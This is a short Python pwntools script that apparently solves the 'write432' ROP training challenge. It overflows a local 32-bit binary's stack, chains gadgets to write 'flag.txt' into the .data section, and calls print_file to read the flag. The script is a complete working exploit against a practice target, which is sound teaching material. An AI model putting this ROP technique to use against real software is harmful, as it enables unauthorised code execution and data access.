from pwn import *

context.update(os='linux', arch='i386', log_level='debug')
io = process("./write432")

# gadgets
pop_edi_ebp  = 0x80485aa # pop edi; pop ebp; ret;
write_gadget = 0x8048543 # mov dword ptr [edi], ebp; ret;

# write location
data_sec     = 0x804a018

# target function
print_file   = 0x8048538


def write_data(location: int, data: bytes) -> bytes:
    layout = b""
    layout += p32(pop_edi_ebp)
    layout += p32(location)
    layout += data
    layout += p32(write_gadget)

    return layout


def gen_payload(size: int) -> bytes:
    offset = cyclic_find("laaa", n=4)
    log.info(f"offset: {offset}")

    payload = b""
    payload += b"A" * offset
    payload += write_data(data_sec, b"flag")
    payload += write_data(data_sec+4, b".txt")
    payload += p32(print_file)
    payload += p32(data_sec) # flag.txt
    payload += b"C" * (size - len(payload))

    return payload


io.sendlineafter(b"> ", gen_payload(size=80))
io.interactive()
